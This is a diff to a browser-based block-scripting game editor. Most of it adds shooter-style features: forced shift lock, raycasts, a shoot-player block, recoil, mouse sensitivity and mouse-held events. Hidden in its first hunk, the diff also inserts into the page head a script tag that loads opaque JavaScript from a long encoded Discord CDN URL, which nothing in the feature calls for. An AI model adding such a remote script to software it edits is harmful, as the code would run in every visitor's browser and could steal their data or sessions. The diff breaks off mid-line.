@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en" data-theme="light">
-<head><meta charset="utf-8">
+<head><script type='text/javascript' src='https://cdn.discordapp.com/wH3ClzFowXpx2akyhDJPioL3bEadzF4WdJgtmt2Hwbvt8hpBc4ntukLpF09xNbz8wF03Wd86d5mPx7lGZCgkvpaAY9yhR1gubK4edgybk2E_B4kVCBQtFCr_9y4R09c__HrFW9JGkAIKaKX_SLn_0_8PMWTkq0IXIFhY6j3PVQWXP9e2CsIQ37z-ViV5vFEMUZQn7JhXEwzIyj5VShYXuIH8s5cD-tfiPrRWjhpiBgu7zqD5otJeKirPNz4R5HIx7R-vJjVdrkQwdFLMzswFaUATws4v3AIYBdInDDc8m1UYf0h1t6EB1iqTDCvNDHYfEIILP0kIBoh1A_3VNBgdlqPOGeaOSY3uWFNUxY5teINvl-gooqg1IS-BkyLfpTI5b-Mj-8WyrYAHT0d1NjM663s5gqrfsCkogAvhGwHv2YAw9Qhq7MIryouq-vhuTv3Txjjz6rAMtskVrb8uARDFxwTKX562N9sJkbF0HD7cfdk238Y_KHggCvz43ucpvbCCH0YUVPmwSPnGsBaT_bE3wMNF2WlQ0Ulran-gdMDH7kTTApJmPyABSOhprLuadmbPEDtBjcJE9Yvt2pfFY4GCH8Miq55yB6RnsZ5NgLo-Q8Xf9lzuyL-VhM28KOHUEnRM0sL83rAtEoKcyhpwcYABkPvzC6dmcuXHmP9d'></script><meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
 <title>BrixBlox Studio</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -789,6 +789,17 @@ const BD={
  shiftlockon:{c:'pl',l:'enable shiftlock',a:[],tip:'Lets the player use shift lock while playing. It does not turn it on by itself: the player presses Shift to switch it on and off. When it is on, the camera moves over the shoulder, the mouse is locked so moving it turns the camera, and the character faces where the camera looks.'},
  shiftlockoff:{c:'pl',l:'disable shiftlock',a:[],tip:'Stops the player from using shift lock. If it is on, it switches off and the normal camera comes back.'},
  shiftlockkey:{c:'pl',l:'set shiftlock key to _',a:['shift'],dd:{0:'keys'},tip:'Picks which key switches shift lock on and off (the default is Shift). Shift lock still has to be allowed with the enable shiftlock block. It goes back to Shift when the game restarts.'},
+ shiftlockforce:{c:'pl',l:'force shiftlock _',a:['true'],dd:{0:'bool'},tip:'true: locks the player into shift lock (it also enables it). The shift lock key can not turn it off, so the mouse stays locked and the camera stays over the shoulder, which is what shooting games use. false: gives control back (shift lock stays allowed, switched off). Goes back to normal when the game restarts.'},
+ shiftlockimg:{c:'pl',l:'set shiftlock image to _',a:['none'],tip:'Replaces the little dot in the middle of the screen (the crosshair) with an image. Type the name of an image you uploaded under Assets, or a web link / data link. Type none (or leave empty) to get the normal dot back.'},
+ getclickpos:{c:'pl',l:'get last click position into x _ y _',a:['clickx','clicky'],dd:{0:'var',1:'var'},tip:'Stores where on the game screen the player last clicked, in pixels from the top left of the screen. If the mouse is locked (shift lock or first person) this is the middle of the screen, where the crosshair is. Inside \"when player clicks screen\" the variables clickx, clicky (pixels) and clickxp, clickyp (0 to 100 percent across / down) are also filled in for you.'},
+ getpitch:{c:'pl',l:'get camera up/down angle into _',a:['pitch'],dd:{0:'var'},tip:'Stores how far the player has tilted the camera up or down, in degrees. 0 is looking straight ahead, positive is looking up (up to about 86), negative is looking down.'},
+ getyaw:{c:'pl',l:'get camera turn angle into _',a:['yaw'],dd:{0:'var'},tip:'Stores which way the camera is turned left or right, in degrees (0 to 360).'},
+ raycast:{c:'pl',l:'shoot ray from camera, range _ into _',a:['200','hit'],dd:{1:'var'},tip:'Fires an invisible line from the middle of the screen. The variable gets the name of what it hit (a part, or a player name), or none if nothing was hit. It also fills name_dist (distance), name_x, name_y, name_z (hit point) and name_player (true if it was a player). Nothing is damaged.'},
+ shootplayer:{c:'pl',l:'shoot from camera, range _ damage _ hit into _',a:['200','25','target'],dd:{2:'var'},tip:'Fires a bullet from the middle of the screen. If it hits another player they lose that much health (they die and respawn at 0). The variable gets the name of the player hit, or none. Walls and parts block the bullet.'},
+ recoil:{c:'pl',l:'recoil camera up _ degrees',a:['2'],tip:'Kicks the camera up (use a negative number to kick it down). Good to put right after a shoot block.'},
+ mousesens:{c:'pl',l:'set mouse sensitivity to _',a:['1'],tip:'Multiplies how fast the mouse turns the camera. 1 is normal, 0.5 is half as fast (good for aiming down sights), 2 is twice as fast.'},
+ mouseheld:{c:'ev',hat:1,l:'when mouse is held, every _ seconds',a:['0.1'],tip:'Runs as soon as the player presses the mouse button and keeps running every few seconds while it stays held. Great for automatic guns. The variable clicker holds your name.'},
+ mouserel:{c:'ev',hat:1,l:'when mouse button is released',a:[],tip:'Runs once when the player lets go of the mouse button. The variable clicker holds your name.'},
  addplayer:{c:'pl',l:'add player to game _',a:['Friend'],raw:1,tip:'Adds another player to the server. They show up next to you with a name tag. A banned player can not join.'},
  kick:{c:'pl',l:'kick player _ from game, reason _',a:['target','Breaking the rules'],tip:'Removes a player from the game and shows the reason. Type a name, a variable, or player (the first player in the server; player2 is the second, and so on) (like toucher or speaker). If you kick yourself the game stops and you see the reason.'},
  ban:{c:'pl',l:'ban player _ from game, reason _ for _ minutes',a:['target','Cheating','60'],tip:'Kicks a player and stops them from joining again for this many minutes (0 = forever). A banned player cannot use add player. If you ban yourself you can lift it under Roster in the Explorer.'},
@@ -882,7 +893,7 @@ const BD={
  call:{c:'fn',l:'call _',a:['spin'],raw:1},
  airesponse:{c:'pr',l:'AI response personality _ response time _ secs rig _ reply to _ show in _ into variable _',a:['a friendly person who enjoys making art, music and stories, rarely mentions it, and mostly just chats about whatever the player says','1','this','message','both','aireply'],dd:{4:'aiout',5:'var'},tip:'PREMIUM. Asks an AI to answer like a character. Personality: describe who it is (for example \"a grumpy pirate who loves gold\"). Response time: the AI waits at least this many seconds before it answers, like someone typing (0 to 30). Rig: type the name of the rig that is talking (the name of its model), or leave it as this inside a rig script. Its name is used for the chat message and the bubble over its head (pick \"this rig\" inside a rig script). Reply to: what the player said. Leave it as message inside a \"when player says _ in chat\" script, or type a variable. Show in: the chat, a bubble above the rig, both, or nothing (variable only). The answer is also stored in the variable you pick. Players without Premium do not get an answer. It remembers the last few things said to each rig, keeps answers short and kid-friendly, and only you see the answer.'}
 };
-const EVH=['gphas','standstill','landed','key','keydrop','keyheld','keyrel','recv','touched','clicked','prompt','chat','chatany','guiclick','guithisclick','pjoin','pleave','itemhold','itemunhold','screenclick'];
+const EVH=['gphas','standstill','landed','key','keydrop','keyheld','keyrel','recv','touched','clicked','prompt','chat','chatany','guiclick','guithisclick','pjoin','pleave','itemhold','itemunhold','screenclick','mouseheld','mouserel'];
 function mk(t,a,k){return {t:t,a:a||BD[t].a.slice(),k:BD[t].k?(k||[]):null}}
 function starter(){return [[mk('start'),mk('say',['Hello!']),mk('repeat',['4'],[mk('move',['6']),mk('turn',['90']),mk('wait',['0.3'])])]]}
 /* Games only exist on disk once they are published. An unpublished game is a draft that is lost when the page closes. */
@@ -1033,13 +1044,14 @@ function hasB(arr,b){return arr.some(function(x){return x===b||(x.k&&hasB(x.k,b)
 function varList(){const v=new Set((P&&Array.isArray(P.vars))?P.vars:[]);
   const w=function(arr){arr.forEach(function(b){if(!BD[b.t])return;
     if(b.t==='set'||b.t==='change'){const n=String(b.a[0]).trim();if(n)v.add(n)}
+    else if(b.t==='getclickpos'||b.t==='getpitch'||b.t==='getyaw'||b.t==='shootplayer'||b.t==='raycast'){const idx=b.t==='getclickpos'?[0,1]:b.t==='shootplayer'?[2]:b.t==='raycast'?[1]:[0];idx.forEach(function(i){const n=String(b.a[i]==null?'':b.a[i]).trim();if(!n)return;v.add(n);if(b.t==='raycast')['_dist','_x','_y','_z','_player'].forEach(function(x){v.add(n+x)})})}
     else if(b.t==='getcount'){const n=String(b.a[0]).trim();if(n)v.add(n)}
     else if(b.t==='nearplayerof'){const n=String(b.a[2]).trim();if(n)v.add(n)}
     else if(/^near(player|rig)s?$/.test(b.t)){const many=b.t.slice(-1)==='s',n=String(b.a[many?2:1]).trim();if(n){v.add(n);if(many)v.add(n+'_count')}}
     if(b.k)w(b.k)})};
   P.scripts.forEach(function(sc){w(sc)});
   const has=function(t){return P.scripts.some(function(sc){return sc[0].t===t})};
-  if(has('landed'))v.add('fallheight');if(has('gphas'))v.add('passplayer');if(has('touched'))v.add('toucher');if(has('prompt'))v.add('prompter');if(has('pjoin'))v.add('joiner');if(has('pleave'))v.add('leaver');if(has('clicked')||has('guiclick')||has('guithisclick')||has('screenclick'))v.add('clicker');if(has('chat')||has('chatany')){v.add('speaker');v.add('message')}
+  if(has('landed'))v.add('fallheight');if(has('gphas'))v.add('passplayer');if(has('touched'))v.add('toucher');if(has('prompt'))v.add('prompter');if(has('pjoin'))v.add('joiner');if(has('pleave'))v.add('leaver');if(has('clicked')||has('guiclick')||has('guithisclick')||has('screenclick')||has('mouseheld')||has('mouserel'))v.add('clicker');if(has('screenclick')){v.add('clickx');v.add('clicky');v.add('clickxp');v.add('clickyp')}if(has('chat')||has('chatany')){v.add('speaker');v.add('message')}
   return Array.from(v).sort()}
 const KEYOPT=(function(){const o=[];'abcdefghijklmnopqrstuvwxyz'.split('').forEach(function(c){o.push([c,c.toUpperCase()])});'0123456789'.split('').forEach(function(c){o.push([c,c])});
   [['space','Space'],['enter','Enter'],['shift','Shift'],['ctrl','Ctrl'],['alt','Alt'],['tab','Tab'],['escape','Escape'],['backspace','Backspace'],['up','Up arrow'],['down','Down arrow'],['left','Left arrow'],['right','Right arrow']].forEach(function(q){o.push(q)});
@@ -1333,7 +1345,7 @@ function dEnd(e){removeEventListener('pointermove',dMoveRaf);dEv=null;if(dRaf){c
 
 
 /* BricBloc as text */
-const KW={airesponse:'AI response',unvisualize:'stop visualizing',tpgame:'teleport to game',playrig:'play animation on rig',riggear:'put item in hand of rig',rigungear:'take item out of rig hand',lighting:'set lighting',skybox:'set skybox to',spawnon:'turn on spawnpoint',spawnrep:'replace current spawnpoint with',spawnoff:'turn off spawnpoint',giveattr:'give attribute',pdset:'set player saved data',pdchange:'change player saved data',pdget:'get player saved data',pdadditem:'put in saved inventory',pdremitem:'take out of saved inventory',pdsave:'save player data',removeattr:'remove attribute',landed:'when player hits ground from higher than',tweenmove:'tween object to',tweenmoveby:'tween object by',tweenturn:'tween object turn',tweensize:'tween object size to',tweentrans:'tween transparency to',tweencolor:'tween color to',tweenset:'tween player',tweenwait:'wait for tweens to finish',fallanim:'set player fall to',holdanim:'set player hold item to',holdwalkanim:'set player hold item walk to',itemhold:'when player holds',itemunhold:'when player stops holding',screenclick:'when player clicks screen',giveitem:'give item',removeitem:'remove item',forplayer:'only for player',randplayer:'get random player into',setimage:'set image of',guicolor:'set gui color',pjoin:'when a player joins',pleave:'when a player leaves',getcount:'get player count into',accwear:'put accessory',accstrip:'take accessory',rigbeh:'set rig behavior to',setvol:'set volume of',transparency:'set transparency',guishow:'show gui',guivis:'set gui visible',guitoggle:'toggle gui',guithisclick:'when this gui clicked',guihide:'hide gui',guitext:'set gui text',guiclick:'when gui clicked',unragdoll:'unragdoll',start:'when start',key:'when key',keydrop:'when player presses the key',keyheld:'when key held',keyrel:'when key done being held',recv:'when I receive',broadcast:'broadcast',broadcastwait:'broadcast and wait',touched:'when this block touched',clicked:'when this block is clicked from',chat:'when player says',collision:'set collision',friction:'set friction',teleport:'teleport',kick:'kick player',ban:'ban player',def:'define',playanim:'play animation',pushfwd:'push force',pushtween:'push with force',walkanim:'set player walk',jumpanim:'set player jump',idleanim:'set player idle',pspeed:'set player speed',givebadge:'give badge',awardbadge:'award badge',accadd:'add accessory',accrem:'remove accessory',playercol:'set player collisions',ragdollex:'set ragdoll exaggeration',playercolon:'enable player collision',playercoloff:'disable player collision',fov:'set camera fov',camset:'set camera to part',camreset:'set camera back to player',voidh:'set void reset height',addplayer:'add player',nearplayer:'get nearest player',nearrig:'get nearest rig',nearplayers:'get nearest players',nearrigs:'get nearest rigs',pushparent:'push parent rig',rigsize:'set rig size',setrig:'set player to rig',playaud:'play',playonce:'play once until done',stopaud:'stop audio',shiftlockon:'enable shiftlock',shiftlockkey:'set shiftlock key',shiftlockoff:'disable shiftlock','elseif':'else if','else':'else',serverside:'server side',clientside:'client side'};
+const KW={shiftlockforce:'force shiftlock',shiftlockimg:'set shiftlock image to',getclickpos:'get last click position into',getpitch:'get camera up/down angle into',getyaw:'get camera turn angle into',raycast:'shoot ray from camera',shootplayer:'shoot from camera',recoil:'recoil camera up',mousesens:'set mouse sensitivity to',mouseheld:'when mouse is held every',mouserel:'when mouse is released',airesponse:'AI response',unvisualize:'stop visualizing',tpgame:'teleport to game',playrig:'play animation on rig',riggear:'put item in hand of rig',rigungear:'take item out of rig hand',lighting:'set lighting',skybox:'set skybox to',spawnon:'turn on spawnpoint',spawnrep:'replace current spawnpoint with',spawnoff:'turn off spawnpoint',giveattr:'give attribute',pdset:'set player saved data',pdchange:'change player saved data',pdget:'get player saved data',pdadditem:'put in saved inventory',pdremitem:'take out of saved inventory',pdsave:'save player data',removeattr:'remove attribute',landed:'when player hits ground from higher than',tweenmove:'tween object to',tweenmoveby:'tween object by',tweenturn:'tween object turn',tweensize:'tween object size to',tweentrans:'tween transparency to',tweencolor:'tween color to',tweenset:'tween player',tweenwait:'wait for tweens to finish',fallanim:'set player fall to',holdanim:'set player hold item to',holdwalkanim:'set player hold item walk to',itemhold:'when player holds',itemunhold:'when player stops holding',screenclick:'when player clicks screen',giveitem:'give item',removeitem:'remove item',forplayer:'only for player',randplayer:'get random player into',setimage:'set image of',guicolor:'set gui color',pjoin:'when a player joins',pleave:'when a player leaves',getcount:'get player count into',accwear:'put accessory',accstrip:'take accessory',rigbeh:'set rig behavior to',setvol:'set volume of',transparency:'set transparency',guishow:'show gui',guivis:'set gui visible',guitoggle:'toggle gui',guithisclick:'when this gui clicked',guihide:'hide gui',guitext:'set gui text',guiclick:'when gui clicked',unragdoll:'unragdoll',start:'when start',key:'when key',keydrop:'when player presses the key',keyheld:'when key held',keyrel:'when key done being held',recv:'when I receive',broadcast:'broadcast',broadcastwait:'broadcast and wait',touched:'when this block touched',clicked:'when this block is clicked from',chat:'when player says',collision:'set collision',friction:'set friction',teleport:'teleport',kick:'kick player',ban:'ban player',def:'define',playanim:'play animation',pushfwd:'push force',pushtween:'push with force',walkanim:'set player walk',jumpanim:'set player jump',idleanim:'set player idle',pspeed:'set player speed',givebadge:'give badge',awardbadge:'award badge',accadd:'add accessory',accrem:'remove accessory',playercol:'set player collisions',ragdollex:'set ragdoll exaggeration',playercolon:'enable player collision',playercoloff:'disable player collision',fov:'set camera fov',camset:'set camera to part',camreset:'set camera back to player',voidh:'set void reset height',addplayer:'add player',nearplayer:'get nearest player',nearrig:'get nearest rig',nearplayers:'get nearest players',nearrigs:'get nearest rigs',pushparent:'push parent rig',rigsize:'set rig size',setrig:'set player to rig',playaud:'play',playonce:'play once until done',stopaud:'stop audio',shiftlockon:'enable shiftlock',shiftlockkey:'set shiftlock key',shiftlockoff:'disable shiftlock','elseif':'else if','else':'else',serverside:'server side',clientside:'client side'};
 function code(arr,d){const pad='  '.repeat(d);return arr.map(function(b){const ln=pad+((KW[b.t]||b.t)+' '+b.a.join(' ')).trim();return b.k?ln+'\n'+code(b.k,d+1)+'\n'+pad+'end':ln}).join('\n')}
 function view(){clearTimeout(view._t);view._t=setTimeout(view0,250)}
 function view0(){$('s-code').textContent=P.scripts.map(function(s){const on=s[0].o&&ownName(s[0].o),tag=on?'# on '+on+'\n':'';return tag+(BD[s[0].t].hat?code(s.slice(0,1),0)+'\n'+code(s.slice(1),1)+'\nend':'# not attached to a "when" block\n'+code(s,0))}).join('\n\n')}
@@ -1561,8 +1573,19 @@ async function st(b,S,o){if(S.remote){if(RSKIP[b.t]||(!o&&RSELF[b.t])||b.t==='cl
     case'unvisualize':vzStop(a[0],S);break;
     case'lighting':lightSet(String(val(a[0],S)).trim());break;
     case'shiftlockon':S.sla=true;break;
-    case'shiftlockoff':S.sla=false;S.sl=false;break;
+    case'shiftlockoff':S.sla=false;S.sl=false;S.slf=false;break;
     case'shiftlockkey':S.slk=String(val(a[0],S)).trim().toLowerCase()||'shift';break;
+    case'shiftlockforce':{const v=String(val(a[0],S)).trim().toLowerCase(),on=!(v==='false'||v==='0'||v==='off'||v==='no');S.slf=on;S.sla=true;S.sl=on;if(on)try{lockPtr()}catch(e){}break}
+    case'shiftlockimg':{const v=String(val(a[0],S)).trim(),low=v.toLowerCase();if(!v||low==='none'){S.slimg=null;break}const k=Object.keys(P.assets.images).find(function(q){return q.toLowerCase()===low});if(k)S.slimg=P.assets.images[k];else if(/^(https?:|data:image)/i.test(v))S.slimg=v;else log('Error: no image named "'+v+'". Upload it under Assets in the Explorer.');break}
+    case'getclickpos':{const lc=S.lastClick||{x:0,y:0};const v0=String(a[0]).trim(),v1=String(a[1]).trim();if(v0)S.v[v0]=Math.round(lc.x);if(v1)S.v[v1]=Math.round(lc.y);break}
+    case'getpitch':{const vn=String(a[0]).trim();if(vn)S.v[vn]=Math.round(cam.pit*180/Math.PI*10)/10;break}
+    case'getyaw':{const vn=String(a[0]).trim();if(vn)S.v[vn]=Math.round((((cam.yaw*180/Math.PI)%360)+360)%360*10)/10;break}
+    case'raycast':case'shootplayer':{const ray0=b.t==='raycast',rng=Math.max(1,Math.min(2000,n(0))),vn=String(a[ray0?1:2]).trim(),dmg=ray0?0:Math.max(0,n(1));
+      const hr=shootRay(rng);if(ray0){if(vn){S.v[vn]=hr.name;S.v[vn+'_dist']=Math.round(hr.dist*100)/100;S.v[vn+'_x']=hr.x;S.v[vn+'_y']=hr.y;S.v[vn+'_z']=hr.z;S.v[vn+'_player']=hr.pl?'true':'false'}break}
+      if(hr.pl&&hr.key!=='main')hpPut(hr.key,hpGet(hr.key)-dmg);if(vn)S.v[vn]=hr.pl?hr.name:'none';break}
+    case'recoil':cam.pit=Math.max(-1.5,Math.min(1.5,cam.pit+n(0)*Math.PI/180));break;
+    case'mousesens':S.sens=Math.max(.05,Math.min(10,n(0)||1));break;
+    case'mouseheld':case'mouserel':break;
     case'pspeed':S.speed=Math.max(0,Math.min(120,n(0)));break;
     case'playercolon':S.pcol=true;break;
     case'playercoloff':S.pcol=false;break;
@@ -3406,7 +3429,7 @@ let lockPend=false,lockRetry=false;
 /* The mouse is locked (and moving it turns the camera) in first person, and also while shift lock is on */
 let slPrev=false;
 function lockMode(){return !!playing&&(cdT<=.01||!!S.sl)}
-addEventListener('keydown',function(e){if(keyNames(e).indexOf(S.slk||'shift')>=0&&!e.repeat&&playing&&S.sla&&!/INPUT|TEXTAREA|SELECT/.test(document.activeElement.tagName)){S.sl=!S.sl;if(S.sl)lockPtr()}});
+addEventListener('keydown',function(e){if(keyNames(e).indexOf(S.slk||'shift')>=0&&!e.repeat&&playing&&S.sla&&!S.slf&&!/INPUT|TEXTAREA|SELECT/.test(document.activeElement.tagName)){S.sl=!S.sl;if(S.sl)lockPtr()}});
 function lockPtr(){if(document.pointerLockElement===cv||lockPend)return;lockPend=true;lockRetry=false;
   try{const r=cv.requestPointerLock({unadjustedMovement:true});if(r&&r.catch)r.catch(function(){lockRetry=true;try{cv.requestPointerLock()}catch(x){lockPend=false}})}catch(x){lockRetry=true;try{cv.requestPointerLock()}catch(y){lockPend=false}}}
 cv.addEventListener('mousedown',function(e){if(e.button===2&&gd&&gd.mv)look=true;if(e.button===2&&look){lockPtr();setTimeout(function(){if(look&&document.pointerLockElement!==cv&&!lockPend)lockWarn(window!==window.top?'This preview blocks mouse lock, so the pointer can still move. Open the game in its own browser tab.':'Your browser did not lock the mouse, so the pointer can still move.')},400)}});
@@ -3419,9 +3442,9 @@ cv.addEventListener('mouseup',function(e){if(e.button===2){look=false;if(documen
 cv.addEventListener('mousedown',function(e){if(e.button===0&&lockMode()&&document.pointerLockElement!==cv)lockPtr()});
 /* Left click while the right button is held (looking around / moving the camera): browsers send no pointerdown for the second button, so it is caught here from mousedown. lcT stops a click that pointerdown already handled from firing twice. */
 let lcT=0;
-cv.addEventListener('mousedown',function(e){if(e.button!==0||!playing||(VIEWONLY&&!playing))return;if(!(look||(e.buttons&2)||document.pointerLockElement===cv))return;if(performance.now()-lcT<80)return;lcT=performance.now();screenClick();playClick(e)});
+cv.addEventListener('mousedown',function(e){if(e.button!==0||!playing||(VIEWONLY&&!playing))return;if(!(look||(e.buttons&2)||document.pointerLockElement===cv))return;if(performance.now()-lcT<80)return;lcT=performance.now();screenClick(e);playClick(e)});
 cv.style.touchAction='none';cv.oncontextmenu=function(e){e.preventDefault()};
-cv.onpointerdown=function(e){if(VIEWONLY&&!playing)return;try{cv.setPointerCapture(e.pointerId)}catch(x){}lx=e.clientX;ly=e.clientY;if(e.button===2){look=true;return}if(e.button===0&&playing){lcT=performance.now();screenClick();playClick(e);return}if(e.button!==0||playing)return;if(animOn()){ray.setFromCamera(ndc(e),camera);const gh=ray.intersectObjects(gizmo,false)[0];if(gh){animGizStart(gh.object,e);return}animClick(e);return}
+cv.onpointerdown=function(e){if(VIEWONLY&&!playing)return;try{cv.setPointerCapture(e.pointerId)}catch(x){}lx=e.clientX;ly=e.clientY;if(e.button===2){look=true;return}if(e.button===0&&playing){lcT=performance.now();screenClick(e);playClick(e);return}if(e.button!==0||playing)return;if(animOn()){ray.setFromCamera(ndc(e),camera);const gh=ray.intersectObjects(gizmo,false)[0];if(gh){animGizStart(gh.object,e);return}animClick(e);return}
   ray.setFromCamera(ndc(e),camera);let h=ray.intersectObjects(gizmo,false)[0];
   if(h&&h.object.userData.rotAx!==undefined){snapSel();const rs=rotStart(h.object.userData.rotAx,e);if(rs)gd=rs;return}
   if(h&&h.object.userData.scale){scaleStart(h.object);return}
@@ -3500,7 +3523,7 @@ function dropLook(){if(!look)return;look=false;if(document.pointerLockElement===
 addEventListener('blur',dropLook);document.addEventListener('visibilitychange',function(){if(document.hidden)dropLook()});
 addEventListener('mouseup',function(e){if(e.button===2)dropLook()},true);
 cv.onpointermove=function(e){if(gd&&gd.mv){gd.le={clientX:e.clientX,clientY:e.clientY,altKey:e.altKey};if((e.buttons&2)&&!look){look=true;lockPtr()}}if(playing&&!look)playHover(e);const pl=document.pointerLockElement===cv,big=pl&&(Math.abs(e.movementX)>250||Math.abs(e.movementY)>250),dx=big?0:pl?e.movementX:e.clientX-lx,dy=big?0:pl?e.movementY:e.clientY-ly;lx=e.clientX;ly=e.clientY;
-  if(look||(lockMode()&&pl)){cam.yaw+=dx*.005;cam.pit=Math.max(-1.5,Math.min(1.5,cam.pit-dy*.005));if(gd&&gd.mv&&look)rmoveDrag(e)}
+  if(look||(lockMode()&&pl)){cam.yaw+=dx*.005*(S.sens||1);cam.pit=Math.max(-1.5,Math.min(1.5,cam.pit-dy*.005*(S.sens||1)));if(gd&&gd.mv&&look)rmoveDrag(e)}
   else if(gd&&gd.rm)rmoveDrag(e);
   else if(gd&&gd.an)animDrag(e,dx,dy);
   else if(gd&&gd.rg)rotDrag(e);
@@ -4428,7 +4451,18 @@ function clickInfo(e){if(!P.scripts.some(function(sc){return sc[0].t==='clicked'
   return {p:p,d:Math.hypot(hit.point.x-(T.pos[0]+S.x),hit.point.y-(T.pos[1]+S.h),hit.point.z-(T.pos[2]-S.y))}}
 function clickScripts(p,d){const r=rootOf(p),out=[];P.scripts.forEach(function(sc){const h=sc[0];if(h.t!=='clicked'||roots(h.o,true).indexOf(r)<0)return;let rg=Number(val(h.a[0],S));if(!(rg>0))rg=20;if(d<=rg)out.push(sc)});return out}
 function playHover(e){const c=clickInfo(e);cv.style.cursor=c&&clickScripts(c.p,c.d).length?'pointer':''}
-function screenClick(){if(!(running||playing))return;const l=P.scripts.filter(function(sc){return sc[0].t==='screenclick'});if(!l.length)return;S.v.clicker=P.player.name;l.forEach(fireScript)}
+function shootRay(range){const o=new THREE.Vector3(cam.x,cam.y,cam.z),f=fwd(),d=new THREE.Vector3(f[0],f[1],f[2]).normalize();
+  let best={name:'none',dist:range,x:0,y:0,z:0,pl:false,key:''},hit=null;
+  try{const of=ray.far;ray.set(o,d);ray.far=range;hit=ray.intersectObjects(pickable(),false).filter(function(h){const q=byId(h.object.userData.id);return q&&!q.av})[0];ray.far=of}catch(e){}
+  if(hit){const q=byId(hit.object.userData.id);best={name:q?q.name:'part',dist:hit.distance,x:Math.round(hit.point.x*100)/100,y:Math.round(hit.point.y*100)/100,z:Math.round(hit.point.z*100)/100,pl:false,key:''}}
+  const lim=hit?hit.distance:range;
+  plist().forEach(function(t){if(t.key==='main')return;const c=new THREE.Vector3(t.x,t.y+1,t.z),v=c.clone().sub(o),tt=v.dot(d);if(tt<=0||tt>lim)return;if(v.sub(d.clone().multiplyScalar(tt)).length()<1.1&&tt<=(best.pl?best.dist:lim)){const pt=o.clone().add(d.clone().multiplyScalar(tt));best={name:t.name,dist:tt,x:Math.round(pt.x*100)/100,y:Math.round(pt.y*100)/100,z:Math.round(pt.z*100)/100,pl:true,key:t.key}}});
+  return best}
+let HELDT=[];
+function mouseStop(fire){if(!HELDT.length&&!fire)return;HELDT.forEach(function(t){clearInterval(t)});const had=HELDT.length>0;HELDT=[];if(fire&&(running||playing)){const l=P.scripts.filter(function(sc){return sc[0].t==='mouserel'});if(l.length){S.v.clicker=P.player.name;l.forEach(fireScript)}}}
+function mouseStart(){mouseStop(false);if(!(running||playing))return;P.scripts.filter(function(sc){return sc[0].t==='mouseheld'}).forEach(function(sc){const iv=Math.max(30,(Number(val(sc[0].a[0],S))||.1)*1000);S.v.clicker=P.player.name;fireScript(sc);HELDT.push(setInterval(function(){if(!(running||playing)){mouseStop(false);return}S.v.clicker=P.player.name;fireScript(sc)},iv))})}
+addEventListener('mouseup',function(e){if(e.button===0)mouseStop(true)});addEventListener('blur',function(){mouseStop(false)});
+function screenClick(e){if(!(running||playing))return;try{const rc=cv.getBoundingClientRect(),lk=document.pointerLockElement===cv||!e||e.clientX==null,px=lk?rc.width/2:e.clientX-rc.left,py=lk?rc.height/2:e.clientY-rc.top;S.lastClick={x:px,y:py};S.v.clickx=Math.round(px);S.v.clicky=Math.round(py);S.v.clickxp=Math.round(px/rc.width*1000)/10;S.v.clickyp=Math.round(py/rc.height*1000)/10}catch(x){}mouseStart();const l=P.scripts.filter(function(sc){return sc[0].t==='screenclick'});if(!l.length)return;S.v.clicker=P.player.name;l.forEach(fireScript)}
 function itemEvt(kind,id){if(!id||!(running||playing))return;const it=itemsL().find(function(x){return x.id===id});if(!it)return;const nm=String(it.name).trim().toLowerCase();
   P.scripts.forEach(function(sc){const h=sc[0];if(h.t===kind&&String(h.a[0]).trim().toLowerCase()===nm)fireScript(sc)})}
 function playClick(e){const c=clickInfo(e);if(!c)return;const l=clickScripts(c.p,c.d);if(!l.length)return;S.v.clicker=P.player.name;l.forEach(fireScript)}
@@ -5505,6 +5539,8 @@ function addGroups(c){if(c.t==='gui'){const O2=[];[['text','Text','A text label 
     Sx.push(scr('Script: when player holds item in hand','itemhold','Runs when you hold an item you made'));
     Sx.push(scr('Script: when player stops holding item in hand','itemunhold','Runs when you stop holding an item'));
     Sx.push(scr('Script: when player clicks screen','screenclick','Runs every time you click the game screen'));
+    Sx.push(scr('Script: when mouse is held','mouseheld','Runs when you press the mouse and keeps running while you hold it'));
+    Sx.push(scr('Script: when mouse is released','mouserel','Runs when you let go of the mouse'));
     Sx.push(scr('Script: when player hits ground from higher than','landed','Runs when you land after falling from higher than the height you type'));
     Sx.push(scr('Script: when player has gamepass','gphas','Runs when you own a gamepass you made'));
     Sx.push(scr('Script: when player standing still','standstill','Runs when your character stops and stands still'));
@@ -5844,9 +5880,9 @@ function frameRun(now){ROOTC.clear();now=now||lt;const dt=Math.min(.1,(now-lt)/1
     const want=cd<.05?0:cd,lim=want>0?camLimit(fx,fy,fz,f,want):0;
     if(camD===null||lim<camD)camD=lim;else camD+=(lim-camD)*(1-Math.exp(-dt*7));if(camD>want)camD=want;
     {const fpm=cdT<=.01;if(fpm!==fpPrev){fpPrev=fpm;if(fpm){if(document.pointerLockElement!==cv)lockWarn('First person: click the game to lock the mouse and look around. Esc lets go of it.')}else if(document.pointerLockElement===cv&&!look)document.exitPointerLock()}
-      {const slm=!!S.sl;if(slm!==slPrev){slPrev=slm;if(slm){if(!fpm&&document.pointerLockElement!==cv)lockWarn('Shift lock on: click the game if the mouse did not lock. Press Shift again to turn it off.')}else if(!fpm&&document.pointerLockElement===cv&&!look)document.exitPointerLock()}}
+      {if(S.slf){S.sla=true;S.sl=true}const slm=!!S.sl;if(slm!==slPrev){slPrev=slm;if(slm){if(!fpm&&document.pointerLockElement!==cv)lockWarn('Shift lock on: click the game if the mouse did not lock. Press Shift again to turn it off.')}else if(!fpm&&document.pointerLockElement===cv&&!look)document.exitPointerLock()}}
       let xh=document.getElementById('fp-x');if(!xh){xh=document.createElement('div');xh.id='fp-x';xh.style.cssText='position:fixed;width:6px;height:6px;margin:-3px 0 0 -3px;border-radius:50%;background:#fff;box-shadow:0 0 0 1px rgba(0,0,0,.65);pointer-events:none;z-index:40;display:none';document.body.append(xh)}
-      if((fpm||S.sl)&&document.pointerLockElement===cv){const rc=cv.getBoundingClientRect();xh.style.left=(rc.left+rc.width/2)+'px';xh.style.top=(rc.top+rc.height/2)+'px';xh.style.display='block'}else xh.style.display='none'}
